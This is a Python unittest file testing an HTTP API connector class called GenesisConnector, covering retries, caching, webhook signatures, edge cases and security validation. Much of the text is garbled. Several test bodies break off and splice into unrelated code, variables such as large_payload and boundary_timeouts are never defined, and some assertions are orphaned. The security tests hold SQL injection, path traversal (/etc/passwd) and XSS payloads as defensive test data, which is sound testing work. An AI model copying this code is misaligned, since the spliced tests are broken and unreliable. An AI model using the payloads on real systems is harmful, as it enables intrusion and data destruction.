                for result in results:
                    self.assertEqual(result['batch'], True)
            except AttributeError:
                # Skip test if batch methods not implemented
                pass

    def test_webhook_validation(self):
        """Test webhook signature validation."""
        webhook_payload = {'event': 'test_event', 'data': {'key': 'value'}}
        secret = 'webhook_secret'
        
        # Generate expected signature
        import hmac
        import hashlib
        
        payload_str = json.dumps(webhook_payload)
        expected_signature = hmac.new(
            secret.encode(),
            payload_str.encode(),
            hashlib.sha256
        ).hexdigest()
        
        try:
            is_valid = self.connector.validate_webhook_signature(
                payload_str, expected_signature, secret
            )
            self.assertTrue(is_valid)
            
            # Test with invalid signature
            is_valid = self.connector.validate_webhook_signature(
                payload_str, 'invalid_signature', secret
            )
            self.assertFalse(is_valid)
        except AttributeError:
            # Skip test if webhook validation not implemented
            pass

    def test_circuit_breaker_functionality(self):
        """Test circuit breaker pattern implementation."""
        with patch('requests.post') as mock_post:
            # Simulate multiple failures to trigger circuit breaker
            mock_response = Mock()
            mock_response.status_code = 500
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                # Make requests until circuit breaker opens
                for i in range(10):
                    try:
                        self.connector.send_request(payload)
                    except Exception:
                        pass
                
                # Circuit breaker should now be open
                with self.assertRaises(RuntimeError):
                    self.connector.send_request(payload)
                    
            except AttributeError:
                # Skip test if circuit breaker not implemented
                pass

    def test_request_deduplication(self):
        """Test request deduplication to prevent duplicate requests."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'dedup': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test', 'idempotency_key': 'unique_key_123'}
            
            try:
                # Send the same request twice
                result1 = self.connector.send_request(payload)
                result2 = self.connector.send_request(payload)
                
                # Should get same result without making duplicate request
                self.assertEqual(result1, result2)
                # Should only make one actual HTTP request
                self.assertEqual(mock_post.call_count, 1)
            except AttributeError:
                # Skip test if deduplication not implemented
                pass

    def test_request_signing(self):
        """Test request signing for enhanced security."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'signed': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            signing_key = 'test_signing_key'
            
            try:
                result = self.connector.send_signed_request(payload, signing_key)
                self.assertEqual(result['signed'], True)
                
                # Verify signature header was added
                call_args = mock_post.call_args
                headers = call_args[1]['headers']
                self.assertIn('X-Signature', headers)
            except AttributeError:
                # Skip test if request signing not implemented
                pass

    def test_response_caching(self):
        """Test response caching functionality."""
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'cached': True}
            mock_response.headers = {'Cache-Control': 'max-age=300'}
            mock_get.return_value = mock_response
            
            try:
                # First request should hit the API
                result1 = self.connector.get_cached_response('test_endpoint')
                self.assertEqual(result1['cached'], True)
                
                # Second request should use cache
                result2 = self.connector.get_cached_response('test_endpoint')
                self.assertEqual(result2['cached'], True)
                
                # Should only make one actual HTTP request
                self.assertEqual(mock_get.call_count, 1)
            except AttributeError:
                # Skip test if caching not implemented
                pass

    def test_request_tracing(self):
        """Test request tracing for debugging and monitoring."""
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'traced': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                result = self.connector.send_request(payload, trace=True)
                self.assertEqual(result['traced'], True)
                
                # Check that tracing information was collected
                trace_info = self.connector.get_trace_info()
                self.assertIn('request_id', trace_info)
                self.assertIn('start_time', trace_info)
                self.assertIn('end_time', trace_info)
            except AttributeError:
                # Skip test if tracing not implemented
                pass

    def test_configuration_hot_reload(self):
        """Test hot reloading configuration without restart."""
        original_config = {'api_key': 'old_key', 'base_url': 'https://old.url'}
        new_config = {'api_key': 'new_key', 'base_url': 'https://new.url'}
        
        connector = GenesisConnector(config=original_config)
        self.assertEqual(connector.config['api_key'], 'old_key')
        
        # Hot reload configuration
        try:
            connector.hot_reload_config(new_config)
            self.assertEqual(connector.config['api_key'], 'new_key')
            self.assertEqual(connector.config['base_url'], 'https://new.url')
        except AttributeError:
            # Fall back to regular reload if hot reload not available
            connector.reload_config(new_config)
            self.assertEqual(connector.config['api_key'], 'new_key')

    def test_memory_usage_monitoring(self):
        """Test memory usage monitoring during operations."""
        try:
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss
            
            # Perform memory-intensive operations
            large_payloads = [
                {'data': 'x' * 1000000} for _ in range(10)  # 10MB of data
            ]
            
            for payload in large_payloads:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            
            current_memory = process.memory_info().rss
            memory_increase = current_memory - initial_memory
            
            # Memory increase should be reasonable (less than 100MB)
            self.assertLess(memory_increase, 100 * 1024 * 1024)
            
        except ImportError:
            # Skip test if psutil not available
            pass

    def test_security_headers_validation(self):
        """Test validation of security-related headers."""
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000'
        }
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'security_headers': security_headers
        })
        
        headers = connector.get_headers()
        
        for security_header, expected_value in security_headers.items():
            self.assertIn(security_header, headers)
            self.assertEqual(headers[security_header], expected_value)

    def test_api_version_negotiation(self):
        """Test API version negotiation."""
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                'supported_versions': ['1.0', '1.1', '2.0'],
                'default_version': '2.0'
            }
            mock_get.return_value = mock_response
            
            try:
                supported_versions = self.connector.get_supported_versions()
                self.assertIn('1.0', supported_versions)
                self.assertIn('2.0', supported_versions)
                
                # Test version negotiation
                negotiated_version = self.connector.negotiate_version('1.1')
                self.assertEqual(negotiated_version, '1.1')
            except AttributeError:
                # Skip test if version negotiation not implemented
                pass

    def test_error_recovery_mechanisms(self):
        """Test various error recovery mechanisms."""
        with patch('requests.post') as mock_post:
            # Test different error scenarios and recovery
            error_scenarios = [
                (ConnectionError("Network unreachable"), True),
                (TimeoutError("Request timeout"), True),
                (ValueError("Invalid response"), False),
                (RuntimeError("Server error"), True)
            ]
            
            for error, should_recover in error_scenarios:
                with self.subTest(error=error.__class__.__name__):
                    mock_post.side_effect = error
                    
                    payload = {'message': 'test'}
                    
                    try:
                        result = self.connector.send_request_with_recovery(payload)
                        if should_recover:
                            self.assertIsNotNone(result)
                        else:
                            self.fail("Expected exception was not raised")
                    except AttributeError:
                        # Skip test if recovery mechanisms not implemented
                        pass
                    except Exception as e:
                        if should_recover:
                            self.fail(f"Recovery failed for {error.__class__.__name__}: {e}")

    def test_load_balancing_across_endpoints(self):
        """Test load balancing across multiple endpoints."""
        endpoints = [
            'https://api1.test.com',
            'https://api2.test.com',
            'https://api3.test.com'
        ]
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'endpoints': endpoints,
            'load_balancing': 'round_robin'
        })
        
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'balanced': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                # Make multiple requests to test load balancing
                for i in range(6):
                    result = connector.send_request(payload)
                    self.assertEqual(result['balanced'], True)
                
                # Should have distributed requests across endpoints
                self.assertEqual(mock_post.call_count, 6)
            except AttributeError:
                # Skip test if load balancing not implemented
                pass



class TestGenesisConnectorIntegration(unittest.TestCase):
    """
    Integration tests for GenesisConnector.
    These tests verify the interaction between components.
    """

    def setUp(self):

        """
        Prepare the integration test environment by initializing a GenesisConnector instance with a test configuration.
        """
        self.connector = GenesisConnector(config={
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': 30
        })

    def test_full_request_lifecycle(self):

        """
        Simulates sending a payload through the connector and verifies that a successful response is returned.
        
        Asserts that the connector processes a POST request correctly and the response contains the expected result.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'result': 'success'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'integration test'}
            result = self.connector.send_request(payload)
            
            self.assertEqual(result['result'], 'success')
            mock_post.assert_called_once()

    def test_connection_and_request_flow(self):

        """
        Verifies that the connector can successfully establish a connection and send a request, returning the correct response data.
        """
        with patch('requests.get') as mock_get, \
             patch('requests.post') as mock_post:
            
            # Mock connection
            mock_get_response = Mock()
            mock_get_response.status_code = 200
            mock_get.return_value = mock_get_response
            
            # Mock request
            mock_post_response = Mock()
            mock_post_response.status_code = 200
            mock_post_response.json.return_value = {'data': 'test'}
            mock_post.return_value = mock_post_response
            
            # Test flow
            self.assertTrue(self.connector.connect())
            result = self.connector.send_request({'message': 'test'})
            
            self.assertEqual(result['data'], 'test')


class TestGenesisConnectorEdgeCases(unittest.TestCase):
    """
    Edge case tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):

        """
        Set up a GenesisConnector instance and mock configuration for edge case testing.
        """
        self.connector = GenesisConnector()


    def test_init_with_malformed_config_types(self):
        """
        Test that initializing GenesisConnector with malformed configuration types raises ValueError or TypeError.
        
        Covers scenarios such as non-string or empty API keys and base URLs, and non-numeric timeout values.
        """
        malformed_configs = [
            {'api_key': 123, 'base_url': 'https://test.com'},  # Non-string api_key
            {'api_key': 'test', 'base_url': 123},  # Non-string base_url
            {'api_key': 'test', 'base_url': 'https://test.com', 'timeout': 'invalid'},  # Non-numeric timeout
            {'api_key': '', 'base_url': 'https://test.com'},  # Empty string api_key
            {'api_key': 'test', 'base_url': ''},  # Empty string base_url
        ]
        
        for config in malformed_configs:
            with self.subTest(config=config):
                with self.assertRaises((ValueError, TypeError)):
                    connector = GenesisConnector(config=config)
                    connector.validate_config(config)

    def test_init_with_unicode_config(self):
        """
        Verify that GenesisConnector initializes successfully with a configuration containing Unicode characters.
        """
        unicode_config = {
            'api_key': 'test_key_🔑',
            'base_url': 'https://api.tëst.com',
            'timeout': 30
        }
        
        connector = GenesisConnector(config=unicode_config)
        self.assertIsNotNone(connector)
        self.assertEqual(connector.config, unicode_config)

    @patch('requests.get')
    def test_connect_with_redirects(self, mock_get):
        """
        Test that the connector's connect method handles HTTP 302 redirects without returning None.
        
        Simulates an HTTP redirect response and verifies that the connect method returns a non-None result, indicating proper handling of redirects.
        """
        mock_response = Mock()
        mock_response.status_code = 302
        mock_response.headers = {'Location': 'https://new.location.com'}
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        # Should handle redirects appropriately
        self.assertIsNotNone(result)

    @patch('requests.get')
    def test_connect_with_ssl_errors(self, mock_get):
        """
        Verify that the connector's connect() method returns False when an SSL certificate error is encountered during the connection attempt.
        """
        import ssl
        mock_get.side_effect = ssl.SSLError("SSL certificate verify failed")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_dns_resolution_error(self, mock_get):
        """
        Test that the connector's connect method returns False when a DNS resolution error occurs.
        
        Simulates a DNS resolution failure by raising a socket.gaierror during the connection attempt and verifies that the connector handles it gracefully.
        """
        import socket
        mock_get.side_effect = socket.gaierror("Name or service not known")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.post')
    def test_send_request_with_binary_payload(self, mock_post):
        """
        Test that the connector correctly processes and sends a request containing binary data in the payload, returning the expected response dictionary.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'binary_processed'}
        mock_post.return_value = mock_response
        
        binary_payload = {
            'message': 'test',
            'large_field': 'x' * (1024 * 1024),  # 1MB string
            'large_list': list(range(10000)),
            'nested_large': {
                'data': ['item' * 100 for _ in range(100)]
            }
        }
        
        try:
            formatted = self.connector.format_payload(large_payload)
            self.assertIsNotNone(formatted)
        except (MemoryError, ValueError) as e:
            # Should handle gracefully
            self.assertIsInstance(e, (MemoryError, ValueError))

    def test_malformed_json_responses(self):
        """Test handling of various malformed JSON responses."""
        malformed_responses = [
            '{"incomplete":',
            '{"trailing_comma":,}',
            '{"duplicate_key":"value1","duplicate_key":"value2"}',
            '{"unescaped_string":"value with "quotes""}',
            '{"number_overflow":999999999999999999999999999999999}',
            '{"invalid_unicode":"\\uXXXX"}',
            '{trailing_data} extra',
            '{"mixed_types":{"string":"value","number":123,"array":[1,2,3],"object":{"nested":true}}}',
        ]
        

        self.assertEqual(result, {'data': 'binary_processed'})

    @patch('requests.post')
    def test_send_request_with_nested_payload(self, mock_post):
        """
        Tests sending a deeply nested payload through the connector and verifies that the response is processed correctly.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'nested_processed'}
        mock_post.return_value = mock_response
        
        for timeout in boundary_timeouts:
            with self.subTest(timeout=timeout):
                config = {
                    'api_key': 'test_key',
                    'base_url': 'https://test.com',
                    'timeout': timeout
                }
                
                if timeout == float('inf'):
                    with self.assertRaises(ValueError):
                        self.connector.validate_config(config)
                else:
                    result = self.connector.validate_config(config)
                    self.assertTrue(result)

    def test_special_characters_in_headers(self):
        """Test handling of special characters in headers."""
        special_headers = {
            'X-Custom-Header': 'value with spaces',
            'X-Unicode-Header': 'café',
            'X-Special-Chars': '!@#$%^&*()',
            'X-Quotes': 'value with "quotes"',
            'X-Newlines': 'value\nwith\nnewlines',
            'X-Tabs': 'value\twith\ttabs',
        }
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'custom_headers': special_headers
        })
        

        self.assertEqual(result, {'data': 'nested_processed'})

    @patch('requests.post')
    def test_send_request_with_circular_reference(self, mock_post):
        """
        Test that sending a payload with a circular reference raises a ValueError or TypeError.
        
        This ensures the connector detects and rejects payloads that cannot be serialized due to circular references.
        """
        # Create circular reference
        payload = {'message': 'test'}
        payload['self'] = payload
        
        # Headers should be properly encoded/escaped
        for key, value in special_headers.items():
            self.assertIn(key, headers)

    @patch('requests.post')
    def test_send_request_with_extremely_large_payload(self, mock_post):
        """
        Test that sending an extremely large payload results in a RuntimeError when the server responds with HTTP 413 (Payload Too Large).
        
        This verifies that the connector properly raises an error when the payload exceeds server limits.
        """
        mock_response = Mock()
        mock_response.status_code = 413  # Payload too large
        mock_post.return_value = mock_response
        
        large_payload = {
            'message': 'x' * 1000000,  # 1MB string
            'large_list': list(range(100000))
        }
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request(large_payload)

    def test_validate_config_with_sql_injection_attempts(self):
        """
        Verify that configuration validation safely handles SQL injection patterns by raising a ValueError or returning a boolean result without executing any injected code.
        """
        malicious_configs = [
            {'api_key': "'; DROP TABLE users; --", 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': "https://test.com'; DELETE FROM config; --"},
            {'api_key': 'test\x00admin', 'base_url': 'https://test.com'},
        ]
        
        def modify_config(connector, config_updates):
            for update in config_updates:
                try:

                    result = self.connector.validate_config(config)
                    # If validation passes, ensure no injection occurred
                    self.assertIsInstance(result, bool)
                except ValueError:
                    # Expected for malicious input
                    pass

    def test_validate_config_with_path_traversal_attempts(self):
        """
        Verify that configuration validation raises a ValueError when the API key or base URL contains path traversal patterns.
        """
        malicious_configs = [
            {'api_key': '../../../etc/passwd', 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': 'https://test.com/../admin'},
            {'api_key': 'test', 'base_url': 'file:///etc/passwd'},
        ]
        
        for config in malicious_configs:
            with self.subTest(config=config):
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_validate_config_with_xss_attempts(self):
        """
        Tests that configuration validation raises a ValueError when the API key or base URL contains XSS attack patterns.
        """
        malicious_configs = [
            {'api_key': '<script>alert("xss")</script>', 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': 'https://test.com<script>alert(1)</script>'},
            {'api_key': 'javascript:alert(1)', 'base_url': 'https://test.com'},
        ]
        
        for config in malicious_configs:
            with self.subTest(config=config):
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    @patch('requests.get')
    def test_get_status_with_timeout_variations(self, mock_get):
        """
        Test that `get_status` returns a status of 'timeout' when different timeout-related exceptions are raised during status retrieval.
        
        Simulates various timeout and connection error scenarios to ensure the connector handles them gracefully by reporting a 'timeout' status.
        """
        import socket
        timeout_scenarios = [
            socket.timeout("Connection timeout"),
            TimeoutError("Request timeout"),
            ConnectionError("Connection reset"),
        ]
        
        for exception in timeout_scenarios:
            with self.subTest(exception=exception):
                mock_get.side_effect = exception
                
                status = self.connector.get_status()
                
                # Should handle timeouts gracefully
                self.assertIn('status', status)
                self.assertEqual(status['status'], 'timeout')

    def test_format_payload_with_datetime_objects(self):
        """
        Test that payload formatting serializes datetime, date, and time objects into supported formats.
        """
        from datetime import datetime, date, time
        
        payload = {
            'timestamp': datetime.now(),
            'date': date.today(),
            'time': time(14, 30, 59),
            'message': 'test'
        }
        
        formatted = self.connector.format_payload(payload)
        
        # Should serialize datetime objects properly
        self.assertIn('timestamp', formatted)
        self.assertIn('date', formatted)
        self.assertIn('time', formatted)

    def test_format_payload_with_decimal_and_complex_numbers(self):
        """
        Verify that the payload formatting method correctly serializes decimal, complex, and float numeric types without errors.
        """
        from decimal import Decimal
        
        payload = {
            'decimal_value': Decimal('123.456'),
            'complex_value': complex(1, 2),
            'float_value': 123.456,
            'message': 'test'
        }
        
        formatted = self.connector.format_payload(payload)
        
        # Should handle numeric types properly
        self.assertIn('decimal_value', formatted)
        self.assertIn('complex_value', formatted)
        self.assertIn('float_value', formatted)

    def test_format_payload_with_custom_objects(self):
        """
        Verify that the payload formatting method includes the string representation of custom objects in the formatted payload.
        """
        class CustomObject:
            def __init__(self, value):
                """
                Initialize the instance with the specified value.
                
                Parameters:
                    value: The value to be stored in the instance.
                """
                self.value = value
            
            def __str__(self):
                """
                Return a string representation of the object, displaying its value in the format 'CustomObject(value)'.
                """
                return f"CustomObject({self.value})"
        
        payload = {
            'custom_obj': CustomObject("test"),
            'message': 'test'
        }
        
        for thread in threads:
            thread.join()
        
        # Should not crash, final config should be valid
        final_config = self.connector.config
        self.assertIsNotNone(final_config)


    @patch('requests.post')
    def test_retry_mechanism_with_exponential_backoff(self, mock_post):
        """
        Verify that the retry mechanism applies exponential backoff delays between retries and raises a RuntimeError after exceeding the maximum retries.
        
        This test ensures that each retry delay increases exponentially and that the function raises an error when all retries fail.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with patch('time.sleep') as mock_sleep:
            with self.assertRaises(RuntimeError):
                self.connector.send_request_with_retry(payload, max_retries=3)
            
            # Verify exponential backoff pattern
            sleep_calls = [call.args[0] for call in mock_sleep.call_args_list]
            self.assertEqual(len(sleep_calls), 3)
            # Each delay should be longer than the previous
            for i in range(1, len(sleep_calls)):
                self.assertGreater(sleep_calls[i], sleep_calls[i-1])

    @patch('requests.post')
    def test_retry_mechanism_with_jitter(self, mock_post):
        """
        Test that the retry mechanism introduces randomized jitter to backoff delays during repeated server errors.
        
        Simulates consecutive HTTP 500 responses and verifies that the retry logic applies jitter to sleep intervals. Expects a RuntimeError after exceeding the maximum retry attempts.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        for i in range(100):
            connector = GenesisConnector(config={'api_key': f'key_{i}'})
            connectors.append(connector)
            weak_refs.append(weakref.ref(connector))
        

        with patch('time.sleep') as mock_sleep:
            with patch('random.random', return_value=0.5):
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Sleep should be called with jitter
                self.assertTrue(mock_sleep.called)

    def test_parse_response_with_edge_case_json(self):
        """
        Tests that the response parser correctly processes JSON strings with edge case structures, such as empty objects, arrays, null values, booleans, numbers, escaped characters, and Unicode content.
        """
        edge_cases = [
            '{"empty_object": {}}',
            '{"empty_array": []}',
            '{"null_value": null}',
            '{"boolean_true": true, "boolean_false": false}',
            '{"number_zero": 0, "number_negative": -123}',
            '{"string_with_escapes": "Hello\\nWorld\\t!"}',
            '{"unicode": "测试 🚀 emoji"}',
        ]
        
        for json_str in edge_cases:
            with self.subTest(json_str=json_str):
                parsed = self.connector.parse_response(json_str)
                self.assertIsInstance(parsed, dict)

    def test_parse_response_with_large_json(self):
        """
        Verify that the connector correctly parses a large JSON string with 10,000 key-value pairs.
        
        Ensures the parsed result contains all expected keys and values from the original JSON.
        """
        large_dict = {f'key_{i}': f'value_{i}' for i in range(10000)}
        large_json = json.dumps(large_dict)
        
        parsed = self.connector.parse_response(large_json)
        
        self.assertEqual(len(parsed), 10000)
        self.assertEqual(parsed['key_0'], 'value_0')
        self.assertEqual(parsed['key_9999'], 'value_9999')

    def test_log_request_with_various_log_levels(self):
        """
        Test that the log_request method logs payloads at each supported logging level without errors.
        """
        log_levels = [
            ('DEBUG', logging.DEBUG),
            ('INFO', logging.INFO),
            ('WARNING', logging.WARNING),
            ('ERROR', logging.ERROR),
        ]
        
        for condition in network_conditions:
            with self.subTest(condition=condition):
                with patch('requests.post') as mock_post:
                    def simulate_network(*args, **kwargs):
                        import time
                        import random
                        
                        # Simulate network delay
                        time.sleep(condition['delay'])
                        
                        # Simulate network errors
                        if random.random() < condition['error_rate']:
                            raise ConnectionError("Simulated network error")
                        
                        mock_response = Mock()
                        mock_response.status_code = 200
                        mock_response.json.return_value = {'simulated': True}
                        return mock_response
                    
                    mock_post.side_effect = simulate_network
                    

                    # Verify logger was called appropriately
                    self.assertTrue(mock_logger.called)

    def test_log_request_with_pii_data(self):
        """
        Test that logging a request with PII fields properly redacts sensitive information before it is logged.
        """
        pii_fields = [
            'ssn', 'social_security_number', 'credit_card', 'phone_number',
            'email', 'address', 'name', 'birth_date', 'license_number'
        ]
        
        for field in pii_fields:
            with self.subTest(field=field):
                payload = {
                    'message': 'test',
                    field: 'sensitive_data_here'
                }
                
                with patch('logging.info') as mock_log:
                    self.connector.log_request(payload)
                    
                    # Verify PII was redacted
                    logged_message = mock_log.call_args[0][0]
                    self.assertNotIn('sensitive_data_here', logged_message)

    def test_get_headers_with_custom_user_agent(self):
        """
        Tests that the connector includes a custom User-Agent header in the generated headers when specified in the configuration.
        """
        custom_config = {
            'api_key': 'test_key',
            'user_agent': 'CustomConnector/1.0'
        }
        
        connector = GenesisConnector(config=custom_config)
        headers = connector.get_headers()
        
        self.assertIn('User-Agent', headers)
        self.assertEqual(headers['User-Agent'], 'CustomConnector/1.0')

    def test_get_headers_with_additional_headers(self):
        """
        Tests that headers returned by the connector include custom headers specified in the configuration.
        """
        custom_config = {
            'api_key': 'test_key',
            'additional_headers': {
                'X-Custom-Header': 'custom_value',
                'X-Request-ID': 'req_123'
            }
        }
        
        connector = GenesisConnector(config=custom_config)
        headers = connector.get_headers()
        
        self.assertIn('X-Custom-Header', headers)
        self.assertIn('X-Request-ID', headers)
        self.assertEqual(headers['X-Custom-Header'], 'custom_value')

    def test_close_connection_with_pending_requests(self):
        """
        Tests that closing the connector while requests are pending completes without raising errors or leaving threads hanging.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = OSError("Too many open files")
            
            payload = {'message': 'resource_test'}
            

            # Should handle gracefully
            self.assertIsNotNone(result)
            request_thread.join(timeout=1)

    def test_context_manager_with_exception(self):
        """
        Test that exceptions raised inside the GenesisConnector context manager block are properly propagated.
        """
        with self.assertRaises(ValueError):
            with GenesisConnector(config=self.mock_config) as connector:
                # Simulate an exception during usage
                raise ValueError("Test exception")

    def test_context_manager_cleanup(self):
        """
        Test that exiting the GenesisConnector context manager triggers the cleanup method.
        
        Ensures that the `close` method is called exactly once when the context is exited.
        """
        with patch.object(GenesisConnector, 'close') as mock_close:
            with GenesisConnector(config=self.mock_config) as connector:
                self.assertIsNotNone(connector)
            
            # Verify cleanup was called
            mock_close.assert_called_once()

    def test_memory_usage_with_large_datasets(self):
        """
        Test that formatting many large payloads does not cause significant memory usage growth.
        
        Formats a series of large payloads and asserts that the connector's reference count remains stable, indicating no substantial memory leaks.
        """
        import sys
        
        # Get initial memory usage
        initial_refs = sys.getrefcount(self.connector)
        
        # Process large dataset
        large_payloads = [
            {'data': list(range(1000)), 'id': i} 
            for i in range(100)
        ]
        
        for payload in large_payloads:
            try:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            except Exception:
                # Expected for some edge cases
                pass
        
        # Memory should not have excessive growth
        final_refs = sys.getrefcount(self.connector)
        self.assertLess(final_refs - initial_refs, 10)

    def test_concurrent_config_updates(self):
        """
        Verify that the connector supports multiple concurrent configuration updates without errors.
        
        Spawns several threads to update the connector's configuration simultaneously and asserts that all updates complete successfully.
        """
        import threading
        import time
        
        results = []
        
        def update_config(config_id):
            """
            Update the connector's configuration using a unique API key and base URL derived from the provided config ID, and record the config ID in the results list.
            
            Parameters:
                config_id (int): The identifier used to generate a unique API key and base URL for the new configuration.
            """
            new_config = {
                'api_key': f'key_{config_id}',
                'base_url': f'https://api{config_id}.test.com'
            }
            self.connector.reload_config(new_config)
            results.append(config_id)
        
        # Start multiple threads updating config
        threads = [
            threading.Thread(target=update_config, args=(i,))
            for i in range(5)
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All updates should complete
        self.assertEqual(len(results), 5)

    def test_error_propagation_chain(self):
        """
        Test that exceptions raised during a request maintain the original exception chain.
        
        Simulates a nested exception when sending a request and asserts that the raised exception preserves its cause.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = MemoryError("Out of memory")
            
            payload = {'message': 'memory_test'}
            
            with self.assertRaises(MemoryError):
                self.connector.send_request(payload)

            
            # Verify error chain is preserved
            self.assertIsNotNone(context.exception)


class TestGenesisConnectorPerformance(unittest.TestCase):
    """
    Performance tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """
        Set up a GenesisConnector instance with a test configuration before each performance test.
        """
        self.connector = GenesisConnector(config={
            'api_key': 'test_key',
            'base_url': 'https://api.test.com'
        })

    def test_payload_formatting_performance(self):
        """
        Test that formatting payloads of various sizes completes in under one second and produces a non-None result.
        """
        import time
        
        timezone_test_cases = [
            datetime.now(timezone.utc),  # UTC
            datetime.now(timezone(timedelta(hours=5))),  # +05:00
            datetime.now(timezone(timedelta(hours=-8))),  # -08:00
            datetime.now(),  # Naive datetime
        ]
        
        for dt in timezone_test_cases:
            with self.subTest(datetime=dt):
                payload = {'timestamp': dt, 'message': 'timezone_test'}
                
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)


    def test_concurrent_request_performance(self):
        """
        Test that 50 concurrent requests are processed by the connector within 5 seconds, ensuring all responses are received and performance requirements are met.
        """
        import concurrent.futures
        import time
        
        def make_request(request_id):
            """
            Send a POST request through the connector with the given request ID in the payload and return the response data.
            
            Parameters:
                request_id: The value to use as the 'id' field in the request payload.
            
            Returns:
                dict: The response data from the connector.
            """
            with patch('requests.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {'id': request_id}
                mock_post.return_value = mock_response
                
                return self.connector.send_request({'id': request_id})
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(make_request, i) 
                for i in range(50)
            ]
            results = [future.result() for future in futures]
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # All requests should complete
        self.assertEqual(len(results), 50)
        
        # Should complete within reasonable time
        self.assertLess(total_time, 5.0)  # Less than 5 seconds

    def test_memory_leak_detection(self):
        """
        Test that repeated payload formatting and header generation do not cause significant memory leaks by verifying object count stability after garbage collection.
        """
        import gc
        import sys
        
        # Force garbage collection
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many operations
        for i in range(100):
            try:
                payload = {'iteration': i, 'data': list(range(100))}
                formatted = self.connector.format_payload(payload)
                
                # Simulate some processing
                headers = self.connector.get_headers()
                
                # Clean up explicitly
                del payload, formatted, headers
                
            except Exception:
                # Expected for some edge cases
                pass
        
        # Force garbage collection again
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Object count should not grow significantly
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 50)  # Allow some growth but not excessive


class TestGenesisConnectorBoundaryConditions(unittest.TestCase):
    """
    Boundary condition tests for GenesisConnector class.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):
        """
        Set up the test fixture for boundary condition tests by creating a GenesisConnector instance.
        """
        self.connector = GenesisConnector()

    def test_extremely_long_api_key(self):
        """
        Test validation of configuration with an extremely long API key.
        
        Verifies that the connector either accepts a very long API key or raises a ValueError if the key length is excessive.
        """
        long_key = 'a' * 10000  # 10KB API key
        config = {
            'api_key': long_key,
            'base_url': 'https://api.test.com'
        }
        
        # Should handle long keys appropriately
        try:
            result = self.connector.validate_config(config)
            self.assertIsInstance(result, bool)
        except ValueError:
            # Expected for excessively long keys
            pass

    def test_maximum_timeout_values(self):
        """
        Test configuration validation with extreme timeout values, including zero, large integers, and infinity, verifying that the connector accepts valid values and raises errors for invalid ones.
        """
        extreme_timeouts = [
            0,  # Minimum
            1,  # Very short
            86400,  # 24 hours
            float('inf'),  # Infinity
            float('-inf'), # Negative infinity
        ]
        
        for value in precision_test_cases:
            with self.subTest(value=value):
                payload = {'precision_value': value, 'message': 'precision_test'}
                

                try:
                    result = self.connector.validate_config(config)
                    # If validation passes, timeout should be reasonable
                    if result:
                        self.assertGreaterEqual(timeout, 0)
                except (ValueError, OverflowError):
                    # Expected for invalid timeout values
                    pass

    def test_url_length_boundaries(self):
        """
        Test configuration validation with base URLs of varying lengths, verifying acceptance of valid URLs and rejection of excessively long ones.
        """
        base_url = 'https://api.test.com'
        
        # Test with increasingly long URLs
        for length in [100, 1000, 2000, 8000]:  # Common URL length limits
